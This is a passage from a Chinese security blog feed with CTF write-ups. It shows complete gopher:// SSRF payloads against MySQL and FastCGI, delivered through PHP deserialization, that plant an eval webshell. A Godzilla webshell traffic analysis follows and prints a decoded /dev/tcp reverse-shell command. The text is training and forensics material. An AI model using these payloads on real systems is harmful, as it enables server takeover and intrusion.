class="string">&#x27;gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%46%00%00%00%03%73%65%6c%65%63%74%20%22%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%50%4f%53%54%5b%31%5d%29%3b%3f%3e%22%20%69%6e%74%6f%20%6f%75%74%66%69%6c%65%20%22%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%31%2e%70%68%70%22%3b%01%00%00%00%01;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>= <span class="keyword">new</span> <span class="title function_ invoke__">dao</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TzozOiJkYW8iOjE6e3M6MTE6IgBkYW8AY29uZmlnIjtPOjY6ImNvbmZpZyI6MTp7czoxMDoidXBkYXRlX3VybCI7czo3NjQ6ImdvcGhlcjovLzEyNy4wLjAuMTozMzA2L18lYTMlMDAlMDAlMDElODUlYTYlZmYlMDElMDAlMDAlMDAlMDElMjElMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlNzIlNmYlNmYlNzQlMDAlMDAlNmQlNzklNzMlNzElNmMlNWYlNmUlNjElNzQlNjklNzYlNjUlNWYlNzAlNjElNzMlNzMlNzclNmYlNzIlNjQlMDAlNjYlMDMlNWYlNmYlNzMlMDUlNGMlNjklNmUlNzUlNzglMGMlNWYlNjMlNmMlNjklNjUlNmUlNzQlNWYlNmUlNjElNmQlNjUlMDglNmMlNjklNjIlNmQlNzklNzMlNzElNmMlMDQlNWYlNzAlNjklNjQlMDUlMzIlMzclMzIlMzUlMzUlMGYlNWYlNjMlNmMlNjklNjUlNmUlNzQlNWYlNzYlNjUlNzIlNzMlNjklNmYlNmUlMDYlMzUlMmUlMzclMmUlMzIlMzIlMDklNWYlNzAlNmMlNjElNzQlNjYlNmYlNzIlNmQlMDYlNzglMzglMzYlNWYlMzYlMzQlMGMlNzAlNzIlNmYlNjclNzIlNjElNmQlNWYlNmUlNjElNmQlNjUlMDUlNmQlNzklNzMlNzElNmMlNDYlMDAlMDAlMDAlMDMlNzMlNjUlNmMlNjUlNjMlNzQlMjAlMjIlM2MlM2YlNzAlNjglNzAlMjAlNjUlNzYlNjElNmMlMjglMjQlNWYlNTAlNGYlNTMlNTQlNWIlMzElNWQlMjklM2IlM2YlM2UlMjIlMjAlNjklNmUlNzQlNmYlMjAlNmYlNzUlNzQlNjYlNjklNmMlNjUlMjAlMjIlMmYlNzYlNjElNzIlMmYlNzclNzclNzclMmYlNjglNzQlNmQlNmMlMmYlMzElMmUlNzAlNjglNzAlMjIlM2IlMDElMDAlMDAlMDAlMDE7Ijt9fQ==</span><br></pre></td></tr></table></figure><p>把结果写入Cookie即可，路径是<code>/index.php</code>，参数是<code>service</code></p><p><img src="https://oss.waynejoons.icu/picphoto/20250808171238869.png"></p><p>最后蚁剑连接webshell即可</p><p><img src="https://oss.waynejoons.icu/picphoto/20250808171259237.png"></p><h3 id="web309"><a href="#web309" class="headerlink" title="web309"></a>web309</h3><p>题目提示mysql有密码了，因此上题打无密码msql的方法在这里用不了</p><p>附件还是和上题一样，这次可以用Gopher<strong>扫描端口</strong>试试</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dao</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$config</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;config=<span class="keyword">new</span> <span class="title function_ invoke__">config</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">config</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$update_url</span> = <span class="string">&#x27;gopher://127.0.0.1:端口&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>= <span class="keyword">new</span> <span class="title function_ invoke__">dao</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><p>常见危险端口：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">21 FTP</span><br><span class="line">22 SSH</span><br><span class="line">80 HTTP</span><br><span class="line">443 HTTPS</span><br><span class="line">3389 RDP</span><br><span class="line">1433 MS-SQL Server</span><br><span class="line">3306 MySQL</span><br><span class="line">6379 Redis</span><br><span class="line">9000 PHP-FPM / FastCGI</span><br></pre></td></tr></table></figure><p>用Gopher请求端口时，如果端口有服务在监听，则会接受连接并等待我们传输数据，此时连接会“卡住”一段时间；如果端口没有服务，则会立刻拒绝连接。通过是否出现等待，就能判断端口是否开放</p><p>方法跟之前一样，也是把结果写入Cookie，路径是<code>/index.php</code>，参数是<code>service</code></p><p><img src="https://oss.waynejoons.icu/picphoto/20250808181225141.png"></p><p>扫描到9000的时候未响应，说明<strong>9000端口开放</strong></p><p><img src="https://oss.waynejoons.icu/picphoto/20250808181310245.png"></p><p>可以用Gopher协议打<strong>FastCGI</strong>，工具也是<strong>Gopherus</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 gopherus.py --exploit fastcgi</span><br></pre></td></tr></table></figure><p>输入以下内容</p><p>已知文件绝对路径：<code>/var/www/html/index.php</code></p><p>待执行命令：<code>echo &quot;&lt;?php eval(\$_POST[1]);?&gt;&quot; &gt; 1.php</code></p><p><img src="https://oss.waynejoons.icu/picphoto/20250808183021767.png"></p><p>得到结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%04%04%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH92%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/var/www/html/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00%5C%04%00%3C%3Fphp%20system%28%27echo%20%22%3C%3Fphp%20eval%28%5C%24_POST%5B1%5D%29%3B%3F%3E%22%20%3E%201.php%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00</span><br></pre></td></tr></table></figure><p>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dao</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$config</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;config=<span class="keyword">new</span> <span class="title function_ invoke__">config</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">config</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$update_url</span> = <span class="string">&#x27;gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%04%04%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH92%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/var/www/html/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00%5C%04%00%3C%3Fphp%20system%28%27echo%20%22%3C%3Fphp%20eval%28%5C%24_POST%5B1%5D%29%3B%3F%3E%22%20%3E%201.php%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>= <span class="keyword">new</span> <span class="title function_ invoke__">dao</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TzozOiJkYW8iOjE6e3M6MTE6IgBkYW8AY29uZmlnIjtPOjY6ImNvbmZpZyI6MTp7czoxMDoidXBkYXRlX3VybCI7czo2NDk6ImdvcGhlcjovLzEyNy4wLjAuMTo5MDAwL18lMDElMDElMDAlMDElMDAlMDglMDAlMDAlMDAlMDElMDAlMDAlMDAlMDAlMDAlMDAlMDElMDQlMDAlMDElMDElMDQlMDQlMDAlMEYlMTBTRVJWRVJfU09GVFdBUkVnbyUyMC8lMjBmY2dpY2xpZW50JTIwJTBCJTA5UkVNT1RFX0FERFIxMjcuMC4wLjElMEYlMDhTRVJWRVJfUFJPVE9DT0xIVFRQLzEuMSUwRSUwMkNPTlRFTlRfTEVOR1RIOTIlMEUlMDRSRVFVRVNUX01FVEhPRFBPU1QlMDlLUEhQX1ZBTFVFYWxsb3dfdXJsX2luY2x1ZGUlMjAlM0QlMjBPbiUwQWRpc2FibGVfZnVuY3Rpb25zJTIwJTNEJTIwJTBBYXV0b19wcmVwZW5kX2ZpbGUlMjAlM0QlMjBwaHAlM0EvL2lucHV0JTBGJTE3U0NSSVBUX0ZJTEVOQU1FL3Zhci93d3cvaHRtbC9pbmRleC5waHAlMEQlMDFET0NVTUVOVF9ST09ULyUwMCUwMCUwMCUwMCUwMSUwNCUwMCUwMSUwMCUwMCUwMCUwMCUwMSUwNSUwMCUwMSUwMCU1QyUwNCUwMCUzQyUzRnBocCUyMHN5c3RlbSUyOCUyN2VjaG8lMjAlMjIlM0MlM0ZwaHAlMjBldmFsJTI4JTVDJTI0X1BPU1QlNUIxJTVEJTI5JTNCJTNGJTNFJTIyJTIwJTNFJTIwMS5waHAlMjclMjklM0JkaWUlMjglMjctLS0tLU1hZGUtYnktU3B5RDNyLS0tLS0lMEElMjclMjklM0IlM0YlM0UlMDAlMDAlMDAlMDAiO319</span><br></pre></td></tr></table></figure><p>把结果写入Cookie即可，路径是<code>/index.php</code>，参数是<code>service</code></p><p><img src="https://oss.waynejoons.icu/picphoto/20250808182623011.png"></p><p>然后蚁剑连接即可</p><p><img src="https://oss.waynejoons.icu/picphoto/20250808183121097.png"></p><h3 id="web310"><a href="#web310" class="headerlink" title="web310"></a>web310</h3><p>附件还是跟web308一样</p><p>方法和上题相同，也是用Gopher协议打<strong>FastCGI</strong></p><p>把结果写入Cookie，路径是<code>/index.php</code>，参数是<code>service</code></p><p><img src="https://oss.waynejoons.icu/picphoto/20250808183718425.png"></p><p>连接蚁剑webshell，但是这次flag不在<code>/var/www/html</code></p><p><img src="https://oss.waynejoons.icu/picphoto/20250808183935633.png"></p><p>找了一下，发现flag在<code>/var/flag</code>目录</p><p><img src="https://oss.waynejoons.icu/picphoto/20250808184043891.png"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>Jay 17：<a href="https://blog.csdn.net/Jayjay___/article/details/133146315">https://blog.csdn.net/Jayjay___/article/details/133146315</a></p>]]></content>
    
    
    <summary type="html">CTFSHOW 代码审计专题详细题解</summary>
    
    
    
    <category term="CTFSHOW" scheme="https://waynejoon.github.io/categories/CTFSHOW/"/>
    
    
    <category term="CTFSHOW" scheme="https://waynejoon.github.io/tags/CTFSHOW/"/>
    
    <category term="CTF练习" scheme="https://waynejoon.github.io/tags/CTF%E7%BB%83%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>玄机靶场 | 哥斯拉4.0流量分析</title>
    <link href="https://waynejoon.github.io/posts/Xuanji-CTF-Godzilla-Traffic-Analysis/"/>
    <id>https://waynejoon.github.io/posts/Xuanji-CTF-Godzilla-Traffic-Analysis/</id>
    <published>2025-08-04T13:20:49.000Z</published>
    <updated>2025-08-04T13:23:50.086Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>登录服务器并结合数据包附件来分析黑客的入侵行为，其中只有第12题需要上机，其他的用数据包附件分析即可</p><p>用户名：root</p><p>密码：<a href="mailto:&#120;&#x6a;&#x40;&#103;&#x73;&#108;&#52;&#46;&#x30;">xj@gsl4.0</a></p><p>SSH连接：ssh root@ip -p 222</p><p>注意SSH端口是<strong>222</strong></p><h2 id="哥斯拉流量特征"><a href="#哥斯拉流量特征" class="headerlink" title="哥斯拉流量特征"></a>哥斯拉流量特征</h2><p><strong>哥斯拉静态特征</strong></p><p>在默认编码情况下，jsp会出现密钥xc、密码pass和Java反射等特征</p><p><img src="https://oss.waynejoons.icu/picphoto/20250804164413767.png"></p><p><strong>哥斯拉动态特征</strong></p><ul><li><p>User-Agent字段（弱特征）：如采用默认情况，会暴露使用的jdk信息，不过哥斯拉支持自定义HTTP头部，这个默认特征可以去除</p></li><li><p>Accept字段（弱特征）：默认是<code>Accept:text/html, image/gif, image/jpeg, *; q=.2, /; q=.2。</code>，这个也可以修改，只能作为辅助手段</p></li><li><p>Cookie最后会有个分号</p></li></ul><p><img src="https://oss.waynejoons.icu/picphoto/20250804164739806.png"></p><p>而正常流量如果没有分点，一般没有分号</p><p><img src="https://oss.waynejoons.icu/picphoto/20250804164852925.png"></p><ul><li>响应数据的格式是固定的：<code>MD5前半部分 + AES加密并Base64编码的结果 + MD5后半部分</code></li></ul><h2 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h2><p><img src="https://oss.waynejoons.icu/picphoto/20250803190142823.png"></p><h2 id="玄机题目"><a href="#玄机题目" class="headerlink" title="玄机题目"></a>玄机题目</h2><h3 id="步骤-1"><a href="#步骤-1" class="headerlink" title="步骤#1"></a>步骤#1</h3><p><strong>黑客的IP是什么？</strong></p><p>首先通过wireshark语法筛选出http流量并过滤掉404状态码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http and !(http.response.code == 404)</span><br></pre></td></tr></table></figure><p>分析流量，可以发现前面有很多GET请求，判断这是攻击者在进行目录扫描</p><p><img src="https://oss.waynejoons.icu/picphoto/20250804171724955.png"></p><p>查看IP统计进一步确认</p><p><img src="https://oss.waynejoons.icu/picphoto/20250804171826676.png"></p><p><img src="https://oss.waynejoons.icu/picphoto/20250804171919936.png"></p><p>可以看到这两个IP出现数量很多，结合前面的分析，因此192.168.31.190是攻击者IP，192.168.31.168是受害者IP</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;192.168.31.190&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-2"><a href="#步骤-2" class="headerlink" title="步骤#2"></a>步骤#2</h3><p><strong>黑客是通过什么漏洞进入服务器的？（提交CVE编号）</strong></p><p>继续分析流量，发现攻击者用PUT请求上传了一个文件</p><p><img src="https://oss.waynejoons.icu/picphoto/20250804172140304.png"></p><p>追踪HTTP流</p><p><img src="https://oss.waynejoons.icu/picphoto/20250804172234380.png"></p><p><img src="https://oss.waynejoons.icu/picphoto/20250804172318358.png"></p><p>出现了密钥xc、密码pass和Java反射类等，符合哥斯拉webshell特征，因此这个hello.jsp文件就是木马文件</p><p>继续分析前面的正常文件，发现网站是<strong>Tomcat</strong>搭建的</p><p><img src="https://oss.waynejoons.icu/picphoto/20250804172728140.png"></p><p>且攻击者PUT方法上传文件之后网站状态码为201</p><p><img src="https://oss.waynejoons.icu/picphoto/20250804173020769.png"></p><p>因此这是一个Tomcat的PUT文件上传漏洞，上网搜索对应漏洞即可</p><p>参考链接：<a href="https://www.cnblogs.com/Junglezt/p/18123082">https://www.cnblogs.com/Junglezt/p/18123082</a></p><p>搜索得到漏洞编号为CVE-2017-12615</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;CVE-2017-12615&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-3"><a href="#步骤-3" class="headerlink" title="步骤#3"></a>步骤#3</h3><p><strong>黑客上传的木马文件名是什么？(提交文件名)</strong></p><p>由步骤二可知，木马文件名为hello.jsp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;hello.jsp&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-4"><a href="#步骤-4" class="headerlink" title="步骤#4"></a>步骤#4</h3><p><strong>黑客上传的木马连接密码是什么？</strong></p><p>参考步骤二可知，连接密码为7f0e6f</p><p>也可以通过看Webshell通信包得到连接密码</p><p><img src="https://oss.waynejoons.icu/picphoto/20250804181800929.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;7f0e6f&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-5"><a href="#步骤-5" class="headerlink" title="步骤#5"></a>步骤#5</h3><p><strong>黑客上传的木马解密密钥是什么？</strong> </p><p>由步骤二可知，密钥为1710acba6220f62b</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;1710acba6220f62b&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-6"><a href="#步骤-6" class="headerlink" title="步骤#6"></a>步骤#6</h3><p><strong>黑客连接webshell后执行的第一条命令是什么？</strong></p><p>这里用到abc123师傅开发的<strong>蓝队分析研判工具箱</strong>，感谢师傅开源</p><p>Github地址：<a href="https://github.com/abc123info/BlueTeamTools">https://github.com/abc123info/BlueTeamTools</a></p><p>首先用wireshark语法把hello.jsp的通信流量全部筛选出来</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http.request.method == POST and http.request.uri contains &quot;hello.jsp&quot;</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250804182519902.png"></p><p>可以看到总共18个数据包，逐个追踪HTTP流</p><p><img src="https://oss.waynejoons.icu/picphoto/20250804183024077.png"></p><p>用蓝队分析研判工具箱进行解密，把请求的body复制进去，然后点击<strong>解密请求数据包</strong></p><p><img src="https://oss.waynejoons.icu/picphoto/20250804183243945.png"></p><p>解密发现<strong>数据流44、45</strong>只是连接哥斯拉时默认执行的，因此忽略不计，从数据流46开始分析</p><p>以下是数据流46到结尾的解密结果</p><p><strong>数据流46</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">请求</span><br><span class="line">cmdLine  sh -c &quot;cd &quot;/&quot;;uname -r&quot; 2&gt;&amp;1arg-3  2&gt;&amp;1executableFile  shexecutableArgs  -c &quot;cd &quot;/&quot;;uname -r&quot; 2&gt;&amp;1arg-0  shargsCount  4arg-1  -carg-2  cd &quot;/&quot;;uname -rmethodName  execCommand</span><br><span class="line">响应</span><br><span class="line">4.19.0-25-amd64</span><br></pre></td></tr></table></figure><p><strong>数据流47</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">请求</span><br><span class="line">cmdLine  sh -c &quot;cd &quot;/&quot;;id&quot; 2&gt;&amp;1arg-3  2&gt;&amp;1executableFile  shexecutableArgs  -c &quot;cd &quot;/&quot;;id&quot; 2&gt;&amp;1arg-0  shargsCount  4arg-1  -carg-2  cd &quot;/&quot;;idmethodName  execCommand</span><br><span class="line">响应</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure><p><strong>数据流48</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">请求</span><br><span class="line">cmdLine  sh -c &quot;cd &quot;/&quot;;cat /etc/os-release&quot; 2&gt;&amp;1arg-3  2&gt;&amp;1executableFile  shexecutableArgs$  -c &quot;cd &quot;/&quot;;cat /etc/os-release&quot; 2&gt;&amp;1arg-0  shargsCount  4arg-1  -carg-2  cd &quot;/&quot;;cat /etc/os-releasemethodName  execCommand</span><br><span class="line">响应</span><br><span class="line">PRETTY_NAME=&quot;Debian GNU/Linux 10 (buster)&quot;</span><br><span class="line">NAME=&quot;Debian GNU/Linux&quot;</span><br><span class="line">VERSION_ID=&quot;10&quot;</span><br><span class="line">VERSION=&quot;10 (buster)&quot;</span><br><span class="line">VERSION_CODENAME=buster</span><br><span class="line">ID=debian</span><br><span class="line">HOME_URL=&quot;https://www.debian.org/&quot;</span><br><span class="line">SUPPORT_URL=&quot;https://www.debian.org/support&quot;</span><br><span class="line">BUG_REPORT_URL=&quot;https://bugs.debian.org/&quot;</span><br></pre></td></tr></table></figure><p><strong>数据流49</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">请求1</span><br><span class="line">cmdLine &amp;   sh -c &quot;cd &quot;/&quot;;rmp -qa | grep pam&quot; 2&gt;&amp;1arg-3  2&gt;&amp;1executableFile  shexecutableArgs #  -c &quot;cd &quot;/&quot;;rmp -qa | grep pam&quot; 2&gt;&amp;1arg-0  shargsCount  4arg-1  -carg-2  cd &quot;/&quot;;rmp -qa | grep pammethodName  execCommand</span><br><span class="line">响应1</span><br><span class="line">2&gt;&amp;1: 1: 2&gt;&amp;1: rmp: not found</span><br><span class="line"></span><br><span class="line">请求2</span><br><span class="line">cmdLine  sh -c &quot;cd &quot;/&quot;;id&quot; 2&gt;&amp;1arg-3  2&gt;&amp;1executableFile  shexecutableArgs  -c &quot;cd &quot;/&quot;;id&quot; 2&gt;&amp;1arg-0  shargsCount  4arg-1  -carg-2  cd &quot;/&quot;;idmethodName  xecCommand</span><br><span class="line">响应2</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure><p><strong>数据流50</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">请求</span><br><span class="line">cmdLine &amp;  sh -c &quot;cd &quot;/&quot;;rpm -qa | grep pam&quot; 2&gt;&amp;1arg-3  2&gt;&amp;1executableFile  shexecutableArgs #  -c &quot;cd &quot;/&quot;;rpm -qa | grep pam&quot; 2&gt;&amp;1arg-0  shargsCount  4arg-1   -carg-2  cd &quot;/&quot;;rpm -qa | grep pammethodName  execCommand</span><br><span class="line">响应</span><br><span class="line">2&gt;&amp;1: 1: 2&gt;&amp;1: rpm: not found</span><br></pre></td></tr></table></figure><p><strong>数据流51</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">请求</span><br><span class="line">cmdLine 0  sh -c &quot;cd &quot;/&quot;;dpkg -l libpam-modules:amd64&quot; 2&gt;&amp;1arg-3  2&gt;&amp;1executableFile  shexecutableArgs -  -c &quot;cd &quot;/&quot;;dpkg -l libpam-modules:amd64&quot; 2&gt;&amp;1arg-0  shargsCount  4arg-1  -carg-2 #  cd &quot;/&quot;;dpkg -l libpam-modules:amd64methodName  execCommand</span><br><span class="line">响应</span><br><span class="line">Desired=Unknown/Install/Remove/Purge/Hold</span><br><span class="line">| Status=Not/Inst/Conf-files/Unpacked/halF-conf/Half-inst/trig-aWait/Trig-pend</span><br><span class="line">|/ Err?=(none)/Reinst-required (Status,Err: uppercase=bad)</span><br><span class="line">||/ Name                 Version      Architecture Description</span><br><span class="line">+++-====================-============-============-========================================</span><br><span class="line">ii  libpam-modules:amd64 1.3.1-5      amd64        Pluggable Authentication Modules for PAM</span><br></pre></td></tr></table></figure><p><strong>数据流52</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">请求</span><br><span class="line">cmdLine l  sh -c &quot;cd &quot;/&quot;;echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMzEuMTQzLzEzMTMgMD4mMQ==|base64 -d|bash&quot; 2&gt;&amp;1arg-3  2&gt;&amp;1executableFile  shexecutableArgs i  -c &quot;cd &quot;/&quot;;echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMzEuMTQzLzEzMTMgMD4mMQ==|base64 -d|bash&quot; 2&gt;&amp;1arg-0  shargsCount  4arg-1  -carg-2 _  cd &quot;/&quot;;echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMzEuMTQzLzEzMTMgMD4mMQ==|base64 -d|bashmethodName  execCommand</span><br><span class="line">响应</span><br><span class="line">空</span><br></pre></td></tr></table></figure><p><strong>数据流53</strong></p><p>空</p><p><strong>数据流54</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">请求</span><br><span class="line">methodName  getFiledirName  /</span><br><span class="line">响应</span><br><span class="line">ok</span><br><span class="line">//</span><br><span class="line">wget-log 1 2024-09-19 08:15:47 0 RW</span><br><span class="line">lib 0 2024-09-18 08:06:13 4096 RWX</span><br><span class="line">usr 0 2023-12-25 02:31:52 4096 RWX</span><br><span class="line">lib32 0 2023-12-25 02:31:48 4096 RWX</span><br><span class="line">libx32 0 2023-12-25 02:31:48 4096 RWX</span><br><span class="line">lost+found 0 2023-12-25 02:31:44 16384 RWX</span><br><span class="line">sbin 0 2024-09-18 08:06:06 12288 